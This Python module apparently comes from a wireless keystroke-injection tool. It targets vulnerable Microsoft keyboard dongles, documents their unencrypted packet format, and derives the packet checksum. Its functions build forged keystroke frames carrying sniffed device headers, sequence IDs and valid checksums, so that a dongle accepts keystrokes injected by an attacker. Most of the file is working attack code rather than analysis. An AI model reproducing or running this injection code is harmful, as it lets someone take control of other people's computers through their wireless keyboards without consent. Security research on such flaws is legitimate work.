"""
This file contains the functionalities required for attacking vulnerable Microsoft dongles.
There are several formats for keystroke packets: unencrypted, XOR-encrypted and AES-encrypted.
But we are only interested in generating unencrypted packets, since they are accepted by vulnerable dongles regardless of the format regularly used by the keyboard/mouse.
The unencrypted packet format is not uniform (for example, different devices produce packets with different lengths), but it generally looks like this:

+-----------------+--------------------------+------------------------------+
|  FIELD          |  LENGTH                  |  NOTES                       |
+-----------------+--------------------------+------------------------------+
|  Device type    |  1 byte                  |  0x08 is typically mouse     |
+-----------------+--------------------------+------------------------------+
|  Packet type    |  1 byte                  |                              |
+-----------------+--------------------------+------------------------------+
|  Model          |  1 byte                  |  0x06 is typically keyboard  |
+-----------------+--------------------------+------------------------------+
|  Unknown        |  1 byte                  |                              |
+-----------------+--------------------------+------------------------------+
|  Sequence ID    |  2 bytes                 |  Little endian               |
+-----------------+--------------------------+------------------------------+
|  Flag           |  1 byte                  |  Always 0x43 in key packets  |
+-----------------+--------------------------+------------------------------+
|  HID modifier   |  1 byte                  |                              |
+-----------------+--------------------------+------------------------------+
|  Unused         |  1 byte                  |                              |
+-----------------+--------------------------+------------------------------+
|  HID scan code  |  1 byte                  |                              |
+-----------------+--------------------------+------------------------------+
|  Unused         |  As much as needed to    |                              |
|                 |  fill the packet length  |                              |
+-----------------+--------------------------+------------------------------+
|  Checksum       |  1 byte                  |                              |
+-----------------+--------------------------+------------------------------+

The 4 bytes at the beginning are collectively referred to as the "header". The header appears to be unique to each device,
and it must be correct for injection to succeed. Since no device encrypts their header when sending packets, we can retrieve headers
by sniffing and store a mapping from known addresses to their headers.
Each address also corresponds to a different packet length, so it's stored too.

References:
1. Slides 41-44 of the KeyKeriki project: http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf
2. KeyKeriki source code: http://www.remote-exploit.org/content/keykeriki-v2-demo-src.zip
3. https://github.com/samyk/keysweeper/tree/master#u-decrypting-keystrokes
"""

from ..hid_scan_codes import *
from ..general_utils import *

DELAY_BETWEEN_TRANSMISSIONS = 5 / 1000 # 5ms
current_seq_id = 0 # the sequence ID should be incremented with each generated packet

def init(pkt_header, pkt_len):
    # define and initialize global variables
    global packet_header
    global packet_len
    global KEEPALIVE_PAYLOAD
    packet_header = pkt_header
    packet_len = pkt_len
    KEEPALIVE_PAYLOAD = build_frame(KEY_RELEASE) # MS doesn't seem to have a keepalive format, but we have to define it for inject_keystrokes(). A key release can be used (simply sent after each keystroke)

def with_checksum(payload):
    """
    This function calculates the checksum of a given Microsoft payload and appends the result at the end of the payload.
    The checksum algorithm shown in slide 43 of the KeyKeriki project (taken from its source code) calculates the checksum for a XOR-encrypted packet, but we want an unencrypted one.
    To XOR-encrypt a packet, the header is unchanged and what's left is XOR-ed with a sequence of bytes created by concatenating the device address with itself for as much as needed to match lengths.
    This includes the checksum byte, so by looking at slide 42 we can deduce that: unenc_cksum = enc_cksum ^ address[1].
    The encrypted checksum is calculated by XOR-ing all bytes (including header) in the UNENCRYPTED payload with each other, then XOR-ing the result with ~address[1].
    But this means that: unenc_cksum = xor_all_bytes ^ ~address[1] ^ address[1] = xor_all_bytes ^ 1 = ~xor_all_bytes
    Hence the algorithm we use here.
    """
    cksum = 0
    for i in range(0, len(payload)):
        cksum ^= payload[i]
    cksum = ~cksum & 0xFF # only the LSB contains the result, anything else is 0xFF bytes
    payload.append(cksum)
    return payload

def build_frame(scan_code, modifier=KEY_MOD_NONE):
    """
    This function receives the scan code and modifier of a keystroke, and returns the proper frame/payload (list of bytes).
    """
    # stating that these variables are the same ones declared in the global scope, not local
    global current_seq_id
    global packet_header
    global packet_len
    payload = payload_str_to_bytes(packet_header) + list(current_seq_id.to_bytes(2, byteorder='little')) + [0x43, modifier, 0x00, scan_code]
    payload += [0x00] * (packet_len - len(payload) - 1)
    current_seq_id = (current_seq_id + 1) & 0xFFFF # incrementing the sequence ID, making sure it doesn't exceed 2 bytes
    return with_checksum(payload)
